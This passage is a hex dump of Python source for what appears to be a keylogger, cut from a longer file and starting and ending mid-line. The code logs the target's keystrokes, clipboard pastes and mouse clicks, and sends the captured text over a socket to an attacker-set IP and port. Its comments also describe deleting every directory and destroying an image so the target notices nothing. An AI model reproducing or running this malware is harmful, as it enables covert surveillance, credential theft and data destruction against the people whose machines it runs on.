+00001900: 6875 7469 6c2e 726d 7472 6565 2865 6163  hutil.rmtree(eac
+00001910: 685f 6469 7229 0d0a 2020 2020 2020 2020  h_dir)..        
+00001920: 2020 2020 2020 2020 2320 5468 6973 2064          # This d
+00001930: 656c 6574 6573 2065 7665 7279 2064 6972  eletes every dir
+00001940: 6563 746f 7279 0d0a 2020 2020 2020 2020  ectory..        
+00001950: 2020 2020 7379 732e 6578 6974 2829 0d0a      sys.exit()..
+00001960: 2020 2020 2020 2020 2020 2020 2320 5374              # St
+00001970: 6f70 7320 7468 6520 6b65 796c 6f67 6765  ops the keylogge
+00001980: 720d 0a20 2020 2020 2020 2065 7863 6570  r..        excep
+00001990: 7420 4b65 7962 6f61 7264 496e 7465 7272  t KeyboardInterr
+000019a0: 7570 743a 0d0a 2020 2020 2020 2020 2020  upt:..          
+000019b0: 2020 2320 4966 2074 6865 2074 6172 6765    # If the targe
+000019c0: 7420 6861 7320 6465 7374 726f 7965 6420  t has destroyed 
+000019d0: 7468 6520 636f 6e6e 6563 7469 6f6e 0d0a  the connection..
+000019e0: 2020 2020 2020 2020 2020 2020 776f 7274              wort
+000019f0: 203d 2022 2a2a 2a25 c2a7 c2a7 29c2 a7c2   = "***%....)...
+00001a00: a725 220d 0a20 2020 2020 2020 2020 2020  .%"..           
+00001a10: 2023 2054 6869 7320 6973 206c 696b 6520   # This is like 
+00001a20: 6120 7370 6563 6961 6c20 636f 6465 2e20  a special code. 
+00001a30: 546f 2073 706c 6974 2069 7420 6174 2074  To split it at t
+00001a40: 6865 2065 6e64 0d0a 2020 2020 2020 2020  he end..        
+00001a50: 2020 2020 666f 7220 7a65 6963 6865 6e20      for zeichen 
+00001a60: 696e 2073 656c 662e 7269 6368 7469 6765  in self.richtige
+00001a70: 5f6c 6973 7465 3a0d 0a20 2020 2020 2020  _liste:..       
+00001a80: 2020 2020 2020 2020 2077 6f72 7420 2b3d           wort +=
+00001a90: 207a 6569 6368 656e 0d0a 2020 2020 2020   zeichen..      
+00001aa0: 2020 2020 2020 6966 2073 656c 662e 636f        if self.co
+00001ab0: 6f72 6469 6e61 7465 733a 0d0a 2020 2020  ordinates:..    
+00001ac0: 2020 2020 2020 2020 2020 2020 776f 7274              wort
+00001ad0: 202b 3d20 7374 7228 7365 6c66 2e63 6f6f   += str(self.coo
+00001ae0: 7264 696e 6174 6573 290d 0a20 2020 2020  rdinates)..     
+00001af0: 2020 2020 2020 2064 6174 6120 3d20 6622         data = f"
+00001b00: 5448 4520 434f 4e4e 4543 5449 4f4e 2048  THE CONNECTION H
+00001b10: 4153 2042 4545 4e20 494e 5445 5252 5550  AS BEEN INTERRUP
+00001b20: 5445 447b 776f 7274 7d22 0d0a 2020 2020  TED{wort}"..    
+00001b30: 2020 2020 2020 2020 2320 5468 6973 206c          # This l
+00001b40: 6574 2773 2074 6865 2073 6572 7665 7220  et's the server 
+00001b50: 6b6e 6f77 2074 6861 7420 7468 6520 7365  know that the se
+00001b60: 7276 6572 2073 686f 756c 6420 7368 7574  rver should shut
+00001b70: 2064 6f77 6e0d 0a20 2020 2020 2020 2020   down..         
+00001b80: 2020 206b 6579 5f64 6174 612e 636f 6e6e     key_data.conn
+00001b90: 6563 7428 2869 705f 6b65 796c 6f67 6765  ect((ip_keylogge
+00001ba0: 722c 2070 6f72 745f 6b65 796c 6f67 6765  r, port_keylogge
+00001bb0: 7229 290d 0a20 2020 2020 2020 2020 2020  r))..           
+00001bc0: 206b 6579 5f64 6174 612e 7365 6e64 2864   key_data.send(d
+00001bd0: 6174 612e 656e 636f 6465 2829 290d 0a20  ata.encode()).. 
+00001be0: 2020 2020 2020 2020 2020 206b 6579 5f64             key_d
+00001bf0: 6174 612e 636c 6f73 6528 290d 0a0d 0a20  ata.close().... 
+00001c00: 2020 2020 2020 2020 2020 2069 6620 6f73             if os
+00001c10: 2e70 6174 682e 6578 6973 7473 2822 496d  .path.exists("Im
+00001c20: 6167 652e 706e 6722 293a 0d0a 2020 2020  age.png"):..    
+00001c30: 2020 2020 2020 2020 2020 2020 2320 4974              # It
+00001c40: 2077 696c 6c20 6465 7374 726f 7920 7468   will destroy th
+00001c50: 6520 696d 6167 6520 736f 2074 6172 6765  e image so targe
+00001c60: 7420 776f 756e 6420 6b6e 6f77 2061 6e79  t wound know any
+00001c70: 7468 696e 670d 0a20 2020 2020 2020 2020  thing..         
+00001c80: 2020 2020 2020 2066 6861 6e64 6c65 2e63         fhandle.c
+00001c90: 6c6f 7365 2829 0d0a 0d0a 2020 2020 2020  lose()....      
+00001ca0: 2020 2020 2020 6e65 775f 7365 7276 6572        new_server
+00001cb0: 203d 2073 6f63 6b65 742e 736f 636b 6574   = socket.socket
+00001cc0: 2873 6f63 6b65 742e 4146 5f49 4e45 542c  (socket.AF_INET,
+00001cd0: 2073 6f63 6b65 742e 534f 434b 5f53 5452   socket.SOCK_STR
+00001ce0: 4541 4d29 0d0a 2020 2020 2020 2020 2020  EAM)..          
+00001cf0: 2020 6e65 775f 7365 7276 6572 2e63 6f6e    new_server.con
+00001d00: 6e65 6374 2828 2231 3237 2e30 2e30 2e31  nect(("127.0.0.1
+00001d10: 222c 2031 3037 3729 290d 0a20 2020 2020  ", 1077))..     
+00001d20: 2020 2020 2020 206e 6577 5f73 6572 7665         new_serve
+00001d30: 722e 7365 6e64 2822 646f 6e65 222e 656e  r.send("done".en
+00001d40: 636f 6465 2829 290d 0a20 2020 2020 2020  code())..       
+00001d50: 2020 2020 206e 6577 5f73 6572 7665 722e       new_server.
+00001d60: 636c 6f73 6528 290d 0a0d 0a20 2020 2064  close()....    d
+00001d70: 6566 206b 696c 6c5f 7377 6974 6368 2873  ef kill_switch(s
+00001d80: 656c 6629 3a0d 0a20 2020 2020 2020 2023  elf):..        #
+00001d90: 2054 6869 7320 6675 6e63 7469 6f6e 2064   This function d
+00001da0: 6573 7472 6f79 7320 7468 6520 6d6f 7573  estroys the mous
+00001db0: 6520 696e 666f 0d0a 2020 2020 2020 2020  e info..        
+00001dc0: 6e65 775f 7365 636f 6e64 7320 3d20 7365  new_seconds = se
+00001dd0: 6c66 2e64 7572 6174 696f 6e20 2b20 350d  lf.duration + 5.
+00001de0: 0a20 2020 2020 2020 2023 2032 3020 7365  .        # 20 se
+00001df0: 636f 6e64 7320 6172 6520 6265 696e 6720  conds are being 
+00001e00: 6164 6465 6420 6265 6361 7573 6520 7468  added because th
+00001e10: 6572 6520 6d69 6768 7420 6265 2061 2070  ere might be a p
+00001e20: 726f 626c 656d 0d0a 2020 2020 2020 2020  roblem..        
+00001e30: 666f 7220 7820 696e 2072 616e 6765 286e  for x in range(n
+00001e40: 6577 5f73 6563 6f6e 6473 293a 0d0a 2020  ew_seconds):..  
+00001e50: 2020 2020 2020 2020 2020 7469 6d65 2e73            time.s
+00001e60: 6c65 6570 2831 290d 0a20 2020 2020 2020  leep(1)..       
+00001e70: 2023 2054 6869 7320 7374 6f70 6573 2074   # This stopes t
+00001e80: 6865 0d0a 2020 2020 2020 2020 7379 732e  he..        sys.
+00001e90: 6578 6974 2829 0d0a 0d0a 2020 2020 6465  exit()....    de
+00001ea0: 6620 6f6e 5f63 6c69 636b 2873 656c 662c  f on_click(self,
+00001eb0: 2078 2c20 792c 2062 7574 746f 6e2c 2070   x, y, button, p
+00001ec0: 7265 7373 6564 293a 0d0a 2020 2020 2020  ressed):..      
+00001ed0: 2020 2320 5468 6973 2069 7320 7468 6520    # This is the 
+00001ee0: 636c 6963 6b20 6675 6e63 7469 6f6e 0d0a  click function..
+00001ef0: 2020 2020 2020 2020 7072 696e 7428 6622          print(f"
+00001f00: 5461 7267 6574 2068 6173 2070 7265 7373  Target has press
+00001f10: 6564 207b 787d 2061 6e64 207b 797d 2229  ed {x} and {y}")
+00001f20: 0d0a 2020 2020 2020 2020 2320 416c 6c20  ..        # All 
+00001f30: 7468 6520 636f 6f72 6469 6e61 7465 7320  the coordinates 
+00001f40: 7769 6c6c 2062 6520 7374 6f72 6564 2069  will be stored i
+00001f50: 6e20 2273 656c 662e 636f 6f72 6469 6e61  n "self.coordina
+00001f60: 7465 7322 0d0a 2020 2020 2020 2020 6966  tes"..        if
+00001f70: 2028 782c 7929 206e 6f74 2069 6e20 7365   (x,y) not in se
+00001f80: 6c66 2e63 6f6f 7264 696e 6174 6573 3a0d  lf.coordinates:.
+00001f90: 0a20 2020 2020 2020 2020 2020 2073 656c  .            sel
+00001fa0: 662e 636f 6f72 6469 6e61 7465 732e 6170  f.coordinates.ap
+00001fb0: 7065 6e64 2828 782c 2079 2929 0d0a 0d0a  pend((x, y))....
+00001fc0: 2020 2020 6465 6620 616c 6c5f 636c 6963      def all_clic
+00001fd0: 6b73 2873 656c 6629 3a0d 0a20 2020 2020  ks(self):..     
+00001fe0: 2020 2023 2054 6869 7320 6973 206a 7573     # This is jus
+00001ff0: 7420 6120 6675 6e63 7469 6f6e 2073 6f20  t a function so 
+00002000: 6974 2063 616e 2062 6520 7261 6e20 7769  it can be ran wi
+00002010: 7468 2074 6872 6561 6469 6e67 0d0a 2020  th threading..  
+00002020: 2020 2020 2020 7769 7468 204c 6973 7465        with Liste
+00002030: 6e65 7228 6f6e 5f63 6c69 636b 3d73 656c  ner(on_click=sel
+00002040: 662e 6f6e 5f63 6c69 636b 2920 6173 206c  f.on_click) as l
+00002050: 6973 7465 6e69 6e67 3a0d 0a20 2020 2020  istening:..     
+00002060: 2020 2020 2020 2073 656c 662e 6b69 6c6c         self.kill
+00002070: 5f73 7769 7463 6828 290d 0a20 2020 2020  _switch()..     
+00002080: 2020 2020 2020 206c 6973 7465 6e69 6e67         listening
+00002090: 2e6a 6f69 6e28 290d 0a0d 0a20 2020 2064  .join()....    d
+000020a0: 6566 2063 6f70 795f 6461 7461 2873 656c  ef copy_data(sel
+000020b0: 6629 3a0d 0a20 2020 2020 2020 2073 656c  f):..        sel
+000020c0: 662e 7269 6368 7469 6765 5f6c 6973 7465  f.richtige_liste
+000020d0: 2e61 7070 656e 6428 2220 2843 4f50 5920  .append(" (COPY 
+000020e0: 2853 7472 672b 6329 2920 2229 0d0a 0d0a  (Strg+c)) ")....
+000020f0: 2020 2020 6465 6620 6170 7065 6e64 5f70      def append_p
+00002100: 6173 7465 2873 656c 6629 3a0d 0a20 2020  aste(self):..   
+00002110: 2020 2020 2064 6174 6120 3d20 6622 2028       data = f" (
+00002120: 7b70 7970 6572 636c 6970 2e70 6173 7465  {pyperclip.paste
+00002130: 2829 7d20 7c20 5041 5354 4520 2853 7472  ()} | PASTE (Str
+00002140: 672b 7629 2920 7c20 220d 0a20 2020 2020  g+v)) | "..     
+00002150: 2020 2073 656c 662e 7269 6368 7469 6765     self.richtige
+00002160: 5f6c 6973 7465 2e61 7070 656e 6428 6461  _liste.append(da
+00002170: 7461 290d 0a0d 0a20 2020 2064 6566 2070  ta)....    def p
+00002180: 7269 6e74 5f77 6f72 6b28 7365 6c66 2c20  rint_work(self, 
+00002190: 776f 7264 293a 0d0a 2020 2020 2020 2020  word):..        
+000021a0: 7072 696e 7428 6627 416c 7068 6162 6574  print(f'Alphabet
+000021b0: 6963 206b 6579 2077 6173 2070 7265 7373  ic key was press
+000021c0: 6564 3a20 7b77 6f72 647d 2027 290d 0a20  ed: {word} ').. 
+000021d0: 2020 2020 2020 2073 656c 662e 7269 6368         self.rich
+000021e0: 7469 6765 5f6c 6973 7465 202b 3d20 776f  tige_liste += wo
+000021f0: 7264 0d0a 2020 2020 2020 2020 2320 4576  rd..        # Ev
+00002200: 6572 7920 7072 6573 7365 6420 6b65 7920  ery pressed key 
+00002210: 7769 6c6c 2062 6520 7361 7665 6420 696e  will be saved in
+00002220: 2022 7269 6368 7469 6765 5f6c 6973 7465   "richtige_liste
+00002230: 2220 7468 6973 2069 7320 6120 6765 726d  " this is a germ
+00002240: 616e 2073 656c 662e 776f 7264 2061 6e64  an self.word and
+00002250: 206d 6561 6e73 2022 7269 6768 745f 6c69   means "right_li
+00002260: 7374 220d 0a0d 0a20 2020 2064 6566 206f  st"....    def o
+00002270: 6e5f 7072 6573 7328 7365 6c66 2c20 6b65  n_press(self, ke
+00002280: 7929 3a0d 0a20 2020 2020 2020 2074 7279  y):..        try
+00002290: 3a0d 0a20 2020 2020 2020 2020 2020 2074  :..            t
+000022a0: 7279 3a0d 0a20 2020 2020 2020 2020 2020  ry:..           
+000022b0: 2020 2020 206f 7468 6572 5f63 6861 7265       other_chare
+000022c0: 6374 6572 7320 3d20 7b22 3122 3a20 2221  cters = {"1": "!
+000022d0: 222c 2022 3222 3a20 2722 272c 2022 3322  ", "2": '"', "3"
+000022e0: 3a20 22c2 a722 2c20 2234 223a 2022 2422  : "..", "4": "$"
+000022f0: 2c20 2235 223a 2022 2522 2c20 2236 223a  , "5": "%", "6":
+00002300: 2022 2622 2c20 2237 223a 2022 2f22 2c20   "&", "7": "/", 
+00002310: 2238 223a 2022 2822 2c0d 0a20 2020 2020  "8": "(",..     
+00002320: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00002330: 2020 2020 2020 2020 2020 2020 2020 2022                 "
+00002340: 3922 3a20 2229 222c 2022 3022 3a20 223d  9": ")", "0": "=
+00002350: 222c 2022 c39f 223a 2022 3f22 7d0d 0a20  ", "..": "?"}.. 
+00002360: 2020 2020 2020 2020 2020 2020 2020 2069                 i
+00002370: 6620 7365 6c66 2e63 6170 7320 6973 2054  f self.caps is T
+00002380: 7275 653a 0d0a 2020 2020 2020 2020 2020  rue:..          
+00002390: 2020 2020 2020 2020 2020 6966 206b 6579            if key
+000023a0: 2e63 6861 7220 696e 206f 7468 6572 5f63  .char in other_c
+000023b0: 6861 7265 6374 6572 733a 0d0a 2020 2020  harecters:..    
+000023c0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+000023d0: 2020 2020 7365 6c66 2e77 6f72 6420 3d20      self.word = 
+000023e0: 6f74 6865 725f 6368 6172 6563 7465 7273  other_charecters
+000023f0: 5b6b 6579 2e63 6861 725d 0d0a 2020 2020  [key.char]..    
+00002400: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00002410: 2020 2020 2320 5570 7065 7220 4368 6172      # Upper Char
+00002420: 6163 7465 7273 2066 726f 6d20 2231 2220  acters from "1" 
+00002430: 746f 2022 3022 2062 6563 6175 7365 2061  to "0" because a
+00002440: 6c6c 2074 6869 7320 6e75 6d62 6572 7320  ll this numbers 
+00002450: 6172 6520 6e6f 7420 6368 6172 6563 7465  are not charecte
+00002460: 7273 2061 7265 206e 6f74 2069 6e20 7079  rs are not in py
+00002470: 6e70 7574 0d0a 2020 2020 2020 2020 2020  nput..          
+00002480: 2020 2020 2020 2020 2020 656c 7365 3a0d            else:.
+00002490: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+000024a0: 2020 2020 2020 2020 2073 656c 662e 776f           self.wo
+000024b0: 7264 203d 206b 6579 2e63 6861 722e 7570  rd = key.char.up
+000024c0: 7065 7228 290d 0a20 2020 2020 2020 2020  per()..         
+000024d0: 2020 2020 2020 2065 6c73 653a 0d0a 2020         else:..  
+000024e0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+000024f0: 2020 7365 6c66 2e77 6f72 6420 3d20 6b65    self.word = ke
+00002500: 792e 6368 6172 0d0a 0d0a 2020 2020 2020  y.char....      
+00002510: 2020 2020 2020 2020 2020 616c 6c5f 7265            all_re
+00002520: 715f 6b65 7973 203d 207b 2203 223a 2073  q_keys = {".": s
+00002530: 656c 662e 636f 7079 5f64 6174 612c 2022  elf.copy_data, "
+00002540: 1622 3a20 7365 6c66 2e61 7070 656e 645f  .": self.append_
+00002550: 7061 7374 657d 0d0a 2020 2020 2020 2020  paste}..        
+00002560: 2020 2020 2020 2020 2320 2245 5458 2220          # "ETX" 
+00002570: 7374 616e 6473 2066 6f72 2022 456e 642d  stands for "End-
+00002580: 5465 7874 2d63 6861 7261 6374 6572 2220  Text-character" 
+00002590: 616e 6420 6973 2061 2063 6f6e 7472 6f6c  and is a control
+000025a0: 2063 6861 7261 6374 6572 2077 6869 6368   character which
+000025b0: 206b 6e6f 7773 2074 6865 2063 6861 7261   knows the chara
+000025c0: 6374 6572 206f 6620 636f 7079 696e 6720  cter of copying 
+000025d0: 736f 6d65 7468 696e 6720 6f6e 2074 6865  something on the
+000025e0: 206b 6579 626f 6172 640d 0a20 2020 2020   keyboard..     
+000025f0: 2020 2020 2020 2020 2020 2023 2022 5359             # "SY
+00002600: 4e22 2073 7461 6e64 7320 666f 7220 2253  N" stands for "S
+00002610: 796e 6368 726f 6e6f 7573 2049 646c 6522  ynchronous Idle"
+00002620: 2061 6e64 2069 7320 6120 636f 6e74 726f   and is a contro
+00002630: 6c20 6368 6172 6163 7465 7220 7768 6963  l character whic
+00002640: 6820 6b6e 6f77 7320 7468 6520 6368 6172  h knows the char
+00002650: 6163 7465 7220 6f66 2070 6173 7469 6e67  acter of pasting
+00002660: 2073 6f6d 6574 6869 6e67 206f 6e20 7468   something on th
+00002670: 6520 6b65 7962 6f61 7264 0d0a 2020 2020  e keyboard..    
+00002680: 2020 2020 2020 2020 2020 2020 666f 7220              for 
+00002690: 6561 6368 5f6b 6579 2069 6e20 616c 6c5f  each_key in all_
+000026a0: 7265 715f 6b65 7973 3a0d 0a20 2020 2020  req_keys:..     
+000026b0: 2020 2020 2020 2020 2020 2020 2020 2069                 i
+000026c0: 6620 6561 6368 5f6b 6579 203d 3d20 6b65  f each_key == ke
+000026d0: 792e 6368 6172 3a0d 0a20 2020 2020 2020  y.char:..       
+000026e0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+000026f0: 2023 2049 6620 7468 6520 636f 7079 2063   # If the copy c
+00002700: 6861 7261 6374 6572 2069 7320 7072 6573  haracter is pres
+00002710: 7365 642c 2065 6163 6820 6675 6e63 7469  sed, each functi
+00002720: 6f6e 206f 6620 6561 6368 2063 6861 7261  on of each chara
+00002730: 6374 6572 2077 696c 6c20 6265 2077 6f72  cter will be wor
+00002740: 6b69 6e67 0d0a 2020 2020 2020 2020 2020  king..          
+00002750: 2020 2020 2020 2020 2020 2020 2020 616c                al
+00002760: 6c5f 7265 715f 6b65 7973 5b65 6163 685f  l_req_keys[each_
+00002770: 6b65 795d 2829 0d0a 2020 2020 2020 2020  key]()..        
+00002780: 2020 2020 2020 2020 7472 793a 0d0a 2020          try:..  
+00002790: 2020 2020 2020 2020 2020 2020 2020 2020                  
+000027a0: 2020 6173 6369 5f6e 756d 6265 7220 3d20    asci_number = 
+000027b0: 6f72 6428 7365 6c66 2e77 6f72 6429 0d0a  ord(self.word)..
+000027c0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+000027d0: 2020 2020 2320 4f72 6469 6e61 6c20 6e75      # Ordinal nu
+000027e0: 6d62 6572 2069 6e20 7468 6520 7261 6e67  mber in the rang
+000027f0: 6520 6f66 2030 2074 6f20 3331 2063 6f6d  e of 0 to 31 com
+00002800: 706c 6574 6573 2061 6c6c 2073 7065 6369  pletes all speci
+00002810: 616c 2063 6861 7261 6374 6572 7320 7769  al characters wi
+00002820: 7468 2074 6865 206b 6579 2022 7374 7267  th the key "strg
+00002830: 202b 206c 6574 7465 7222 0d0a 2020 2020   + letter"..    
+00002840: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00002850: 6966 2061 7363 695f 6e75 6d62 6572 206e  if asci_number n
+00002860: 6f74 2069 6e20 7261 6e67 6528 302c 2033  ot in range(0, 3
+00002870: 3229 3a0d 0a20 2020 2020 2020 2020 2020  2):..           
+00002880: 2020 2020 2020 2020 2020 2020 2023 2069               # i
+00002890: 6620 7468 6572 6520 6973 206e 6f20 7370  f there is no sp
+000028a0: 6563 6961 6c20 6368 6172 6163 7465 7220  ecial character 
+000028b0: 6974 206a 7573 7420 7072 696e 7473 2074  it just prints t
+000028c0: 6865 2061 6c70 6861 6265 7469 6320 6e75  he alphabetic nu
+000028d0: 6d62 6572 0d0a 2020 2020 2020 2020 2020  mber..          
+000028e0: 2020 2020 2020 2020 2020 2020 2020 7365                se
+000028f0: 6c66 2e70 7269 6e74 5f77 6f72 6b28 7365  lf.print_work(se
+00002900: 6c66 2e77 6f72 6429 0d0a 0d0a 2020 2020  lf.word)....    
+00002910: 2020 2020 2020 2020 2020 2020 6578 6365              exce
+00002920: 7074 2054 7970 6545 7272 6f72 3a0d 0a20  pt TypeError:.. 
+00002930: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00002940: 2020 2023 2070 7269 6e74 7320 7468 6520     # prints the 
+00002950: 616c 7068 6162 6574 6320 6e75 6d62 6572  alphabetc number
+00002960: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
+00002970: 2020 2020 2020 7365 6c66 2e70 7269 6e74        self.print
+00002980: 5f77 6f72 6b28 7365 6c66 2e77 6f72 6429  _work(self.word)
+00002990: 0d0a 0d0a 2020 2020 2020 2020 2020 2020  ....            
+000029a0: 2020 2020 7072 696e 7428 7365 6c66 2e72      print(self.r
+000029b0: 6963 6874 6967 655f 6c69 7374 6529 0d0a  ichtige_liste)..
+000029c0: 2020 2020 2020 2020 2020 2020 6578 6365              exce
+000029d0: 7074 2054 7970 6545 7272 6f72 3a0d 0a20  pt TypeError:.. 
+000029e0: 2020 2020 2020 2020 2020 2020 2020 2070                 p
+000029f0: 6173 730d 0a0d 0a20 2020 2020 2020 2065  ass....        e
+00002a00: 7863 6570 7420 4174 7472 6962 7574 6545  xcept AttributeE
+00002a10: 7272 6f72 3a0d 0a20 2020 2020 2020 2020  rror:..         
+00002a20: 2020 2070 7269 6e74 2866 2741 6e20 6f74     print(f'An ot
+00002a30: 6865 7220 6b65 7920 7761 7320 7072 6573  her key was pres
+00002a40: 7365 643a 207b 6b65 797d 2729 0d0a 2020  sed: {key}')..  
+00002a50: 2020 2020 2020 2020 2020 6966 206b 6579            if key
+00002a60: 203d 3d20 6b65 7962 6f61 7264 2e4b 6579   == keyboard.Key
+00002a70: 2e73 7061 6365 206f 7220 6b65 7920 3d3d  .space or key ==
+00002a80: 206b 6579 626f 6172 642e 4b65 792e 7461   keyboard.Key.ta
+00002a90: 623a 0d0a 2020 2020 2020 2020 2020 2020  b:..            
+00002aa0: 2020 2020 7365 6c66 2e72 6963 6874 6967      self.richtig
+00002ab0: 655f 6c69 7374 6520 2b3d 2022 7b22 0d0a  e_liste += "{"..
+00002ac0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00002ad0: 2320 4966 2074 6865 2074 6172 6765 7420  # If the target 
+00002ae0: 7072 6573 7365 7320 7461 6220 6f72 2073  presses tab or s
+00002af0: 7061 6365 2061 2022 7b22 2077 696c 6c20  pace a "{" will 
+00002b00: 6265 2061 7070 656e 6465 6420 746f 2074  be appended to t
+00002b10: 6865 206c 6973 7420 736f 2074 6865 2061  he list so the a
+00002b20: 7474 6163 6b65 7220 6b6e 6f77 7320 7768  ttacker knows wh
+00002b30: 656e 2061 6e64 0d0a 2020 2020 2020 2020  en and..        
+00002b40: 2020 2020 2020 2020 2320 7370 6163 6520          # space 
+00002b50: 6f72 2061 2074 6162 206b 6579 2068 6173  or a tab key has
+00002b60: 2062 6565 6e20 7072 6573 7365 640d 0a20   been pressed.. 
+00002b70: 2020 2020 2020 2020 2020 2065 6c69 6620             elif 
+00002b80: 6b65 7920 3d3d 206b 6579 626f 6172 642e  key == keyboard.
+00002b90: 4b65 792e 6361 7073 5f6c 6f63 6b3a 0d0a  Key.caps_lock:..
+00002ba0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00002bb0: 7365 6c66 2e63 6170 7320 3d20 5472 7565  self.caps = True
+00002bc0: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
+00002bd0: 2020 7365 6c66 2e63 6865 636b 2e61 7070    self.check.app
+00002be0: 656e 6428 3129 0d0a 2020 2020 2020 2020  end(1)..        
+00002bf0: 2020 2020 6368 6563 6b5f 6361 7073 203d      check_caps =
+00002c00: 2073 756d 2873 656c 662e 6368 6563 6b29   sum(self.check)
+00002c10: 202f 2032 0d0a 2020 2020 2020 2020 2020   / 2..          
+00002c20: 2020 2320 4966 2063 6865 636b 5f63 6170    # If check_cap
+00002c30: 7320 6973 206e 6f74 2070 7269 6d61 7279  s is not primary
+00002c40: 2069 7420 7769 6c6c 2073 6574 2073 656c   it will set sel
+00002c50: 662e 6361 7073 2074 6f20 4661 6c73 650d  f.caps to False.
+00002c60: 0a0d 0a20 2020 2020 2020 2020 2020 2069  ...            i
+00002c70: 6620 7374 7228 6368 6563 6b5f 6361 7073  f str(check_caps
+00002c80: 295b 2d31 5d20 213d 2027 3027 3a0d 0a20  )[-1] != '0':.. 
+00002c90: 2020 2020 2020 2020 2020 2020 2020 2070                 p
+00002ca0: 6173 730d 0a20 2020 2020 2020 2020 2020  ass..           
+00002cb0: 2065 6c73 653a 0d0a 2020 2020 2020 2020   else:..        
+00002cc0: 2020 2020 2020 2020 7365 6c66 2e63 6170          self.cap
+00002cd0: 7320 3d20 4661 6c73 650d 0a20 2020 2020  s = False..     
+00002ce0: 2020 2020 2020 2020 2020 2023 2054 6869             # Thi
+00002cf0: 7320 7265 7365 7473 2065 7665 7279 7468  s resets everyth
+00002d00: 696e 670d 0a0d 0a20 2020 2020 2020 2020  ing....         
+00002d10: 2020 2069 6620 6b65 7920 3d3d 206b 6579     if key == key
+00002d20: 626f 6172 642e 4b65 792e 6261 636b 7370  board.Key.backsp
+00002d30: 6163 653a 0d0a 2020 2020 2020 2020 2020  ace:..          
+00002d40: 2020 2020 2020 6474 203d 2064 6174 6574        dt = datet
+00002d50: 696d 652e 6e6f 7728 290d 0a20 2020 2020  ime.now()..     
+00002d60: 2020 2020 2020 2020 2020 2023 2047 6574             # Get
+00002d70: 7320 7468 6520 6375 7272 656e 7420 7469  s the current ti
+00002d80: 6d65 0d0a 2020 2020 2020 2020 2020 2020  me..            
+00002d90: 2020 2020 6765 745f 7469 6d65 203d 2073      get_time = s
+00002da0: 7472 2864 7429 2e73 706c 6974 2822 3a22  tr(dt).split(":"
+00002db0: 290d 0a20 2020 2020 2020 2020 2020 2020  )..             
+00002dc0: 2020 2023 2054 6869 7320 7370 6c69 7473     # This splits
+00002dd0: 2074 6865 2074 696d 6520 736f 2074 6865   the time so the
+00002de0: 206d 696e 7574 6573 2061 6e64 2073 6563   minutes and sec
+00002df0: 6f6e 6473 2061 7265 2064 6973 706c 6179  onds are display
+00002e00: 6564 0d0a 0d0a 2020 2020 2020 2020 2020  ed....          
+00002e10: 2020 2020 2020 686f 7572 2c20 6d69 6e75        hour, minu
+00002e20: 7465 732c 2073 6563 203d 2069 6e74 2867  tes, sec = int(g
+00002e30: 6574 5f74 696d 655b 305d 5b3a 3a2d 315d  et_time[0][::-1]
+00002e40: 5b30 3a32 5d5b 3a3a 2d31 5d29 2c20 696e  [0:2][::-1]), in
+00002e50: 7428 6765 745f 7469 6d65 5b31 5d29 2c20  t(get_time[1]), 
+00002e60: 666c 6f61 7428 6765 745f 7469 6d65 5b32  float(get_time[2
+00002e70: 5d29 0d0a 2020 2020 2020 2020 2020 2020  ])..            
+00002e80: 2020 2020 2320 4765 7473 2074 6865 2063      # Gets the c
+00002e90: 7572 7265 6e74 2068 6f75 722c 206d 696e  urrent hour, min
+00002ea0: 7574 6520 616e 6420 7365 636f 6e64 0d0a  ute and second..
+00002eb0: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
+00002ec0: 2020 616c 6c20 3d20 686f 7572 202a 2033    all = hour * 3
+00002ed0: 3630 3020 2b20 6d69 6e75 7465 7320 2a20  600 + minutes * 
+00002ee0: 3630 202b 2073 6563 0d0a 2020 2020 2020  60 + sec..      
+00002ef0: 2020 2020 2020 2020 2020 2320 4765 7473            # Gets
+00002f00: 2074 6865 2073 6563 6f6e 6473 206f 6620   the seconds of 
+00002f10: 6576 6572 7974 6869 6e67 2066 726f 6d20  everything from 
+00002f20: 686f 7572 2074 6f20 7365 636f 6e64 0d0a  hour to second..
+00002f30: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00002f40: 6966 206e 6f74 2073 656c 662e 7365 636f  if not self.seco
+00002f50: 6e64 733a 0d0a 2020 2020 2020 2020 2020  nds:..          
+00002f60: 2020 2020 2020 2020 2020 2320 4966 2074            # If t
+00002f70: 6865 7265 2069 7320 6e6f 7468 696e 6720  here is nothing 
+00002f80: 696e 2074 6865 206c 6973 7420 7365 636f  in the list seco
+00002f90: 6e64 2077 696c 6c20 6265 2061 7070 616e  nd will be appan
+00002fa0: 6465 640d 0a20 2020 2020 2020 2020 2020  ded..           
+00002fb0: 2020 2020 2020 2020 2073 656c 662e 7365           self.se
+00002fc0: 636f 6e64 732e 6170 7065 6e64 2861 6c6c  conds.append(all
+00002fd0: 290d 0a20 2020 2020 2020 2020 2020 2020  )..             
+00002fe0: 2020 206d 696e 7573 203d 2061 6c6c 202d     minus = all -
+00002ff0: 2073 656c 662e 7365 636f 6e64 735b 305d   self.seconds[0]
+00003000: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
+00003010: 2020 2320 5468 6973 2063 6865 636b 7320    # This checks 
+00003020: 6966 2074 6865 2074 6172 6765 7420 6973  if the target is
+00003030: 2068 6f6c 6469 6e67 2074 6865 2062 6163   holding the bac
+00003040: 6b73 7061 6365 206b 6579 0d0a 2020 2020  kspace key..    
+00003050: 2020 2020 2020 2020 2020 2020 6966 206d              if m
+00003060: 696e 7573 203e 2030 2e30 3520 6f72 206d  inus > 0.05 or m
+00003070: 696e 7573 203d 3d20 302e 303a 0d0a 2020  inus == 0.0:..  
+00003080: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00003090: 2020 6966 2073 656c 662e 7269 6368 7469    if self.richti
